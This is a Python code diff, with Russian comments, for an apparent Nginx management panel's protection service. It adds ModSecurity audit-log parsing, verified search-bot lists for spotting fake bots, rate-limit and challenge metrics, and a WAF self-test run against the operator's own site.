+                                "kind_title": KINDS.get(kind, kind), "cat": rule_category(kind, rule)}
+        if kind == "waf" and "/" in rule:
+            wr = W.RULE_BY_ID.get(rule.split("/", 1)[1])
+            if wr:
+                meta.update({"id": wr.id, "level": wr.level, "note": wr.note, "examples": list(wr.examples)[:3],
+                             "cve": wr.cve, "pattern": wr.pattern,
+                             "fields": [W.TARGETS[t][1] for t in wr.targets if t in W.TARGETS],
+                             "category": W.CATEGORIES.get(wr.cat, {}).get("title", wr.cat),
+                             "mode": self.svc.settings().mode(wr.cat),
+                             "disabled": wr.id in self.svc.settings().waf_disabled_rules})
+        if kind == "modsec":
+            meta["crs_group"] = CRS_GROUPS.get(rule.split("/", 1)[-1][:3], ("", ""))[1]
+        return {"meta": meta, "hours": hours, "step": step, "since": since, "series": series, "totals": tot,
+                "sites": sites, "ips": ips, "paths": paths, "uas": uas,
+                "events": self.svc.events(limit=30, kind=kind, site=site, q=rule)}
+
+
+def _in_net(ip: str, net: str) -> bool:
+    try:
+        return ipaddress.ip_address(ip) in ipaddress.ip_network(net, strict=False)
+    except ValueError:
+        return False
+
+
+# =============================================================================
 #  Служба
 # =============================================================================
 class ProtectionService:
@@ -224,6 +731,11 @@ class ProtectionService:
         self.recent: deque = deque(maxlen=200)     # последние события для живой ленты
         self.challenge_stats: Counter = Counter()  # served/passed/failed
         self.totals: Counter = Counter()           # (сайт, вид, действие) → число с запуска (для /metrics)
+        self.pm: Counter = Counter()               # (минута, сайт, метрика, ключ) → число (prot_minute)
+        self.pm_ms: Counter = Counter()            # то же → сумма миллисекунд (время решения проверки)
+        self.modsec_pos: Tuple[int, int] = (0, -1)  # (inode, смещение) журнала аудита ModSecurity
+        self.modsec_titles: Dict[str, str] = {}
+        self.bot_totals: Counter = Counter()        # (робот, ok|fake) → число с запуска (для /metrics)
         self._lock: Optional[asyncio.Lock] = None
         self.feed_task_running = False
 
@@ -279,6 +791,12 @@ class ProtectionService:
         else:
             st["sites"].pop(key, None)
         self.db.kv_set("attack_mode", st)
+        pkey = "*" if key is None else key
+        now = time.time()
+        self.db.execute("UPDATE attack_periods SET end=? WHERE site=? AND end IS NULL", (now, pkey))
+        if on:
+            self.db.execute("INSERT INTO attack_periods(site,start,auto,who,reason) VALUES(?,?,?,?,?)",
+                            (pkey, now, 1 if auto else 0, user, reason[:300]))
         ok, out = await self.sync_attack_file()
         who = "автоматически" if auto else user
         name = "всех сайтов" if key is None else f"сайта «{self.site_name(key)}»"
@@ -389,6 +907,25 @@ class ProtectionService:
                 total += 1
         return "\n".join(lines) + "\n", total
 
+    def render_bots(self) -> Tuple[str, str]:
+        """Файлы для geo $nm_vbot (адрес → робот) и map $nm_bot_claim (User-Agent → робот). В карту User-Agent
+        попадают только роботы, чьи адреса загружены: иначе любой настоящий робот считался бы поддельным."""
+        p = self.settings()
+        nets = ["# Nginx Manager: официальные адреса роботов (раздел «Защита → Роботы»). Файл обновляется панелью."]
+        uas = ["# Nginx Manager: User-Agent проверяемых роботов. Файл обновляется панелью."]
+        on = p.fake_bot_action != "off" or p.verified_skip_challenge
+        for b in p.verified_bots:
+            path = self.feed_dir() / f"bot-{b.id}.txt"
+            if not (on and b.enabled and path.exists()):
+                continue
+            items = path.read_text().split()
+            if not items:
+                continue
+            for net in items:
+                nets.append(f"{net} {b.id};")
+            uas.append(f"{W.nginx_quote('~*(?:' + b.ua + ')')} {b.id};")
+        return "\n".join(nets) + "\n", "\n".join(uas) + "\n"
+
     async def update_feeds(self, force: bool = False, only: Optional[str] = None) -> Dict[str, Any]:
         p = self.settings()
         status = self.feed_status()
@@ -409,10 +946,41 @@ class ProtectionService:
                 status[f.id] = {"ok": True, "count": len(nets), "skipped": bad, "updated": now, "error": ""}
             except Exception as e:  # noqa: BLE001 — сеть, формат, файл: ошибка показывается у списка
                 prev = status.get(f.id, {})
-                status[f.id] = {**prev, "ok": False, "error": str(e)[:300], "tried": now}
-                self.db.event("warning", "protection", f"Список угроз «{f.name}» не обновлён: {e}")
+                status[f.id] = {**prev, "ok": False, "error": feed_error(e), "tried": now}
+                self.db.event("warning", "protection", f"Список угроз «{f.name}» не обновлён: {feed_error(e)}")
             results[f.id] = status[f.id]
+        p_bots = [b for b in p.verified_bots if b.enabled] \
+            if (p.fake_bot_action != "off" or p.verified_skip_challenge) else []
+        for b in p_bots:
+            if only and only != f"bot:{b.id}":
+                continue
+            key = f"bot:{b.id}"
+            st = status.get(key, {})
+            if not force and st.get("updated") and now - st["updated"] < p.threat_update_hours * 3600 and st.get("ok"):
+                continue
+            try:
+                text = await asyncio.to_thread(fetch_feed, b.url)
+                nets, bad = parse_feed(text)
+                if not nets:
+                    raise ValueError("в списке не найдено ни одного адреса")
+                (self.feed_dir() / f"bot-{b.id}.txt").write_text("\n".join(nets) + "\n")
+                status[key] = {"ok": True, "count": len(nets), "skipped": bad, "updated": now, "error": ""}
+            except Exception as e:  # noqa: BLE001
+                prev = status.get(key, {})
+                status[key] = {**prev, "ok": False, "error": feed_error(e), "tried": now}
+                self.db.event("warning", "protection", f"Адреса робота «{b.name}» не обновлены: {feed_error(e)}")
+            results[key] = status[key]
         self.db.kv_set("threat_status", status)
+        if p_bots or any(not b.enabled for b in p.verified_bots):
+            bots, ua = self.render_bots()
+            mgr = self.app.nginx
+            async with mgr.lock:
+                ok1, out1 = await asyncio.to_thread(mgr.write_side_file, settings.bots_file, bots)
+                ok2, out2 = await asyncio.to_thread(mgr.write_side_file, settings.bots_ua_file, ua) if ok1 \
+                    else (False, out1)
+            if not (ok1 and ok2):
+                self.db.event("error", "protection", "Не удалось подключить адреса роботов к nginx",
+                              {"output": (out2 or out1)[-1500:]})
         content, total = self.render_threats()
         mgr = self.app.nginx
         async with mgr.lock:
@@ -436,17 +1004,29 @@ class ProtectionService:
                    "challenge": "challenged"}.get(wa)
             if act:
                 kind = wf.split("/", 1)[0]
-                kind = kind if kind in ("custom", "threat", "hotlink") else "waf"
+                kind = kind if kind in ("custom", "threat", "hotlink", "fakebot") else "waf"
                 events.append((kind, wf, act))
+        mn = int(ts // 60) * 60
         if ch in ("c", "c0"):
             events.append(("challenge", "challenge", "challenged"))
             self.challenge_stats["served"] += 1
+            if not test:
+                self.pm[(mn, site, "challenge", "served")] += 1
         elif ch == "c1":
             self.challenge_stats["passed"] += 1
+            if not test:
+                self.pm[(mn, site, "challenge", "passed")] += 1
+        if r.get("rs") == "REJECTED" or (status == 429 and not r.get("ustatus") and not r.get("rs")):
+            # rs — $limit_req_status (nginx 1.17.6+); 429 без ответа бэкенда — ограничение частоты или соединений
+            events.append(("ratelimit", "ratelimit/" + (r.get("ri") or "site"), "blocked"))
+        bt = r.get("bt") or ""
+        if bt and bt[0] != ":" and not test:
+            bot, _, ok = bt.partition(":")
+            key = f"{bot}:{'ok' if ok == '1' else 'fake'}"
+            self.pm[(mn, site, "bot", key)] += 1
+            self.bot_totals[(bot, "ok" if ok == "1" else "fake")] += 1
         if status == 421:
             events.append(("sni", "sni", "blocked"))
-        if status == 429 and not r.get("ustatus"):
-            events.append(("ratelimit", "limit_req", "blocked"))
         ip = r.get("ip") or ""
         if site not in ("-", "panel", "") and self._honeypot(site, uri):
             events.append(("honeypot", "honeypot", "banned"))
@@ -543,10 +1123,148 @@ class ProtectionService:
         det.candidates.append(info)
         det.suspicious[ip] = info
 
+    @property
+    def analytics(self) -> "ProtectionAnalytics":
+        if not hasattr(self, "_analytics"):
+            self._analytics = ProtectionAnalytics(self)
+        return self._analytics
+
+    def ip_in_feeds(self, ip: str) -> List[Dict[str, str]]:
+        """В каких загруженных списках угроз и диапазонах роботов есть адрес."""
+        try:
+            addr = ipaddress.ip_address(ip)
+        except ValueError:
+            return []
+        p = self.settings()
+        out = []
+        items = [(f"{f.id}.txt", f.name, "threat", f.action) for f in p.threat_feeds if f.enabled] + \
+                [(f"bot-{b.id}.txt", b.name, "bot", "") for b in p.verified_bots if b.enabled]
+        for fn, name, typ, action in items:
+            path = self.feed_dir() / fn
+            if not path.exists():
+                continue
+            try:
+                for net in path.read_text().split():
+                    if "/" not in net:
+                        if net == ip:
+                            out.append({"name": name, "type": typ, "action": action, "net": net})
+                            break
+                    elif addr in ipaddress.ip_network(net, strict=False):
+                        out.append({"name": name, "type": typ, "action": action, "net": net})
+                        break
+            except (OSError, ValueError):
+                continue
+        return out
+
+    # ------------------------------------------------------------------ ModSecurity: журнал аудита
+    @staticmethod
+    def modsec_log() -> Path:
+        return settings.log_dir / "nm-modsec-audit.log"
+
+    def modsec_tick(self, from_start: bool = False) -> int:
+        """Дочитать журнал аудита ModSecurity (JSON, транзакция на строку) и записать события в журнал атак.
+        При запуске панели читаем с конца файла, после ротации — с начала нового."""
+        path = self.modsec_log()
+        try:
+            st = path.stat()
+        except OSError:
+            return 0
+        ino, pos = self.modsec_pos
+        if pos < 0:
+            pos = 0 if from_start else st.st_size
+        elif ino != st.st_ino or st.st_size < pos:
+            pos = 0
+        if st.st_size <= pos:
+            self.modsec_pos = (st.st_ino, pos)
+            return 0
+        with path.open("rb") as f:
+            f.seek(pos)
+            data = f.read(min(st.st_size - pos, 16 * 1024 * 1024))
+        cut = data.rfind(b"\n")
+        if cut < 0:
+            return 0
+        self.modsec_pos = (st.st_ino, pos + cut + 1)
+        n = 0
+        for line in data[:cut].splitlines():
+            try:
+                tr = json.loads(line)["transaction"]
+            except (ValueError, KeyError, TypeError):
+                continue
+            if self.observe_modsec(tr):
+                n += 1
+        return n
+
+    def observe_modsec(self, tr: Dict[str, Any], ts: Optional[float] = None) -> bool:
+        ts = ts or time.time()
+        uid = str(tr.get("unique_id") or "")
+        site, _, rest = uid.partition("-")
+        _pa, _, rid = rest.partition("-")
+        req = tr.get("request") or {}
+        hdr = {str(k).lower(): v for k, v in (req.get("headers") or {}).items()}
+        uri = str(req.get("uri") or "")
+        test = "nm_selftest=" in uri
+        code = int((tr.get("response") or {}).get("http_code") or 0)
+        best = None
+        for m in tr.get("messages") or []:
+            d = m.get("details") or {}
+            rule = str(d.get("ruleId") or "")
+            if not rule or rule in CRS_SKIP or rule.startswith("90") or rule.startswith("419"):
+                continue
+            try:
+                sev = int(d.get("severity") or 9)
+            except ValueError:
+                sev = 9
+            if best is None or sev < best[0]:
+                best = (sev, rule, str(m.get("message") or "")[:200])
+        if best is None:
+            return False
+        rule = best[1]
+        if best[2]:
+            self.modsec_titles[rule] = best[2]
+        act = "blocked" if code in (400, 403) else "detected"
+        ip = str(tr.get("client_ip") or "")
+        agg = getattr(getattr(self.app, "stats", None), "agg", None)
+        country = ""
+        try:
+            if agg is not None and self.app.panel().geoip_enabled and agg.geoip.reader:
+                country = agg.geoip.country(ip)
+        except Exception:  # noqa: BLE001
+            country = ""
+        r = {"method": req.get("method") or "", "uri": uri, "ua": hdr.get("user-agent", ""), "status": code,
+             "rid": rid, "host": hdr.get("host", "")}
+        site = site if site.isdigit() else ""
+        self._count(ts, site, "modsec", f"modsec/{rule}", act, test)
+        self._row(ts, site, ip, country, "modsec", f"modsec/{rule}", act, r, test)
+        if not test:
+            self._autoban(ip, ts, f"modsec/{rule}", uri, country, r["host"])
+        return True
+
+    def record_challenge(self, site: str, result: str, secs: Optional[float] = None) -> None:
+        """Итог проверки браузера (решена / неверное решение) от страницы проверки панели."""
+        site = site if site.isdigit() else ""
+        self.challenge_stats[result] += 1
+        mn = int(time.time() // 60) * 60
+        self.pm[(mn, site, "challenge", result)] += 1
+        if secs is not None:
+            self.pm_ms[(mn, site, "challenge", result)] += int(secs * 1000)
+            b = "lt1" if secs < 1 else "1_3" if secs < 3 else "3_10" if secs < 10 else "gt10"
+            self.pm[(mn, site, "solve", b)] += 1
+
     def flush(self) -> int:
         """Записать накопленное в базу (вызывается раз в несколько секунд)."""
         rows, self.pending_rows = self.pending_rows, []
         counts, self.counts = self.counts, Counter()
+        pm, self.pm = self.pm, Counter()
+        pm_ms, self.pm_ms = self.pm_ms, Counter()
+        if pm:
+            self.db.executemany("INSERT INTO prot_minute(ts,site,metric,key,n,ms) VALUES(?,?,?,?,?,?) "
+                                "ON CONFLICT(ts,site,metric,key) DO UPDATE SET n=n+excluded.n, ms=ms+excluded.ms",
+                                [(*k, n, pm_ms.get(k, 0)) for k, n in pm.items()])
+        if self.modsec_titles:
+            titles = self.db.kv_get("modsec_titles", {}) or {}
+            if any(titles.get(k) != v for k, v in self.modsec_titles.items()):
+                titles.update(self.modsec_titles)
+                self.db.kv_set("modsec_titles", dict(list(titles.items())[-3000:]))
         if rows:
             self.db.executemany("INSERT INTO attack_log(ts,site,ip,country,kind,rule,action,method,uri,ua,status,rid,"
                                 "host,test) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)", rows)
@@ -560,6 +1278,8 @@ class ProtectionService:
         cut = time.time() - self.settings().log_days * 86400
         self.db.execute("DELETE FROM attack_log WHERE ts<?", (cut,))
         self.db.execute("DELETE FROM attack_minute WHERE ts<?", (cut,))
+        self.db.execute("DELETE FROM prot_minute WHERE ts<?", (cut,))
+        self.db.execute("DELETE FROM attack_periods WHERE end IS NOT NULL AND end<?", (cut,))
 
     # ------------------------------------------------------------------ отчёты
     def overview(self, hours: int = 24, site: str = "") -> Dict[str, Any]:
@@ -595,7 +1315,10 @@ class ProtectionService:
         for r in rules:
             r["title"] = self.rule_title(r["kind"], r["rule"])
         glob, active = self.active_attack()
+        chal = {r["key"]: r["n"] for r in self.db.query(
+            f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {cond} AND metric='challenge' GROUP BY key", args)}
         return {"hours": hours, "since": since, "totals": tot, "by_kind": by_kind, "rules": rules, "sites": sites,
+                "challenge_period": chal,
                 "ips": ips, "countries": countries, "uris": uris, "step": step, "series": buckets,
                 "attack": {"global": glob, "sites": active, "state": self.attack_state()},
                 "challenge": dict(self.challenge_stats), "kinds": KINDS, "actions": ACTIONS}
@@ -616,7 +1339,28 @@ class ProtectionService:
                 if f.id == fid:
                     return f"Список угроз: {f.name}"
             return rule
+        if kind == "modsec":
+            rid = rule.split("/", 1)[-1]
+            grp = CRS_GROUPS.get(rid[:3], ("", ""))[1]
+            msg = self.modsec_titles.get(rid) or self._modsec_title_db(rid)
+            return f"ModSecurity {rid}: {msg or grp or 'правило CRS'}"
+        if kind == "fakebot":
+            bid = rule.split("/", 1)[-1]
+            for b in self.settings().verified_bots:
+                if b.id == bid:
+                    return f"Поддельный робот: {b.name}"
+            return f"Поддельный робот: {bid}"
+        if kind == "ratelimit":
+            rid = rule.split("/", 1)[-1]
+            for rr in self.settings().rate_rules:
+                if rr.id == rid:
+                    return f"Ограничение частоты: {rr.name}"
+            return "Ограничение частоты сайта или входа" if rid in ("site", "") else f"Ограничение частоты: {rid}"
         return KINDS.get(kind, kind)
+
+    def _modsec_title_db(self, rid: str) -> str:
+        titles = self.db.kv_get("modsec_titles", {}) or {}
+        return titles.get(rid, "")
 
     def events(self, limit: int = 200, before: Optional[float] = None, site: str = "", ip: str = "",
                kind: str = "", action: str = "", q: str = "", rid: str = "", test: Optional[bool] = False
@@ -664,6 +1408,12 @@ class ProtectionService:
         token = os.urandom(4).hex()
         cases = selftest_cases(p.waf_level)
         results = []
+        # пропуск проверки браузера для самих запросов самопроверки: в режиме «Под атакой» иначе всё получило бы
+        # страницу проверки, и самопроверка проверяла бы её, а не фильтр (адрес источника — адрес подключения)
+        from .challenge import pass_token
+        exp = int(time.time()) + 900
+        pass_cookie = f"nm_pass={pass_token(self.app.nginx.challenge_secret(), exp, host if p.challenge_bind_ip else '')}; " \
+                      f"nm_pass_e={exp}"
 
         def run(case, n):
             # пробелы, кавычки и # недопустимы в строке запроса HTTP — их кодирует любой клиент, кодируем и мы
@@ -672,9 +1422,14 @@ class ProtectionService:
             target = f"{path}{sep}nm_selftest={token}{n}"
             hdrs = dict(case["headers"])
             hdrs.setdefault("User-Agent", "Mozilla/5.0 (NginxManager-SelfTest)")
+            if "Cookie" not in hdrs:
+                hdrs["Cookie"] = pass_cookie
+            else:
+                hdrs["Cookie"] += "; " + pass_cookie
             t0 = time.time()
             try:
-                st, h = raw_request(host, port, tls, domain, case["method"], target, hdrs)
+                st, h = raw_request(host, port, tls, domain, case["method"], target, hdrs,
+                                    body=case.get("body", "").encode())
                 err = ""
             except OSError as e:
                 st, h, err = None, {}, str(e)
@@ -689,6 +1444,17 @@ class ProtectionService:
             results.append({**{k: case[k] for k in ("rule", "cat", "title", "method", "field")},
                             "payload": case["payload"][:160], "mode": mode, "status": st, "blocked": blocked,
                             "error": err, "ms": ms, "n": n})
+        from .nginx import ProtectionConf
+        msmode = ProtectionConf(state, self.app.nginx.paths(str(settings.live_dir)), self.app.nginx.caps()) \
+            .modsec_site(site)
+        if msmode != "off":
+            for n, (title, ctype, body) in enumerate(MODSEC_CASES):
+                case = {"path": "/", "headers": {"Content-Type": ctype}, "method": "POST", "body": body}
+                st, h, err, ms = await asyncio.to_thread(run, case, 500 + n)
+                results.append({"rule": "modsec", "cat": "modsec", "title": f"Тело запроса: {title}", "method": "POST",
+                                "field": "тело запроса", "payload": body[:160], "mode": msmode, "status": st,
+                                "blocked": st in (400, 403, 405, 444) or (st is None and not err), "error": err,
+                                "ms": ms, "n": 500 + n})
         benign = []
         for n, path in enumerate(BENIGN_CASES):
             case = {"path": path, "headers": {}, "method": "GET"}
@@ -696,6 +1462,8 @@ class ProtectionService:
             benign.append({"path": path, "status": st, "blocked": st in (403, 444) or st is None, "error": err})
         # «запись в журнал» видна только в журнале атак: ждём, пока сборщик дочитает журнал nginx
         await asyncio.sleep(3)
+        if msmode != "off":
+            await asyncio.to_thread(self.modsec_tick)
         self.flush()
         logged = {r["uri"] for r in self.db.query("SELECT uri FROM attack_log WHERE test=1 AND uri LIKE ?",
                                                   (f"%nm_selftest={token}%",))}
@@ -736,6 +1504,9 @@ class ProtectionService:
         blocked_core = sum(modes.get(c) == "block" for c in core)
         detect_core = sum(modes.get(c) == "detect" for c in core)
         caps = self.app.nginx.caps()
+        from .nginx import ProtectionConf
+        msmode = ProtectionConf(self.app.nginx.load_state(), self.app.nginx.paths(str(settings.live_dir)), caps) \
+            .modsec_site(site)
         checks = [
             ("https", "Сайт работает по HTTPS", 10, https, "ssl", "Подключите сертификат на вкладке «SSL / HTTPS»"),
             ("redirect", "HTTP перенаправляется на HTTPS", 4, https and site.ssl.force_https, "ssl",
@@ -781,6 +1552,11 @@ class ProtectionService:
             ("body", "Ограничен размер тела запроса", 2, bool(site.performance.client_max_body_size
                                                               or g.client_max_body_size), "performance",
              "Задайте client_max_body_size"),
+            ("modsec", "Проверяется тело запроса (ModSecurity + OWASP CRS)", 6, msmode == "block", "protection",
+             "Установите libnginx-mod-http-modsecurity и modsecurity-crs и включите «Глубокую проверку» в режиме "
+             "блокировки" if msmode == "off" else "Глубокая проверка в режиме записи — переведите в блокировку"),
+            ("fakebot", "Поддельные поисковые роботы отсекаются", 2, p.fake_bot_action in ("block", "challenge")
+             and any(b.enabled for b in p.verified_bots), "protection", "«Защита → Роботы»: блокировать поддельных"),
         ]
         total = sum(w for _, _, w, *_ in checks)
         got = sum(w for _, _, w, ok, *_ in checks if ok)
@@ -796,6 +1572,8 @@ class ProtectionService:
         while True:
             try:
                 await asyncio.sleep(5)
+                if self.settings().modsec_enabled:
+                    await asyncio.to_thread(self.modsec_tick)
                 await asyncio.to_thread(self.flush)
                 now = time.time()
                 if now - last_min >= 60:
@@ -803,7 +1581,10 @@ class ProtectionService:
                     await self.auto_attack_tick(now)
                 if now - last_feeds >= 600:
                     last_feeds = now
-                    if any(f.enabled for f in self.settings().threat_feeds):
+                    ps = self.settings()
+                    if any(f.enabled for f in ps.threat_feeds) or (
+                            any(b.enabled for b in ps.verified_bots)
+                            and (ps.fake_bot_action != "off" or ps.verified_skip_challenge)):
                         await self.update_feeds()
                 if now - last_clean >= 3600:
                     last_clean = now
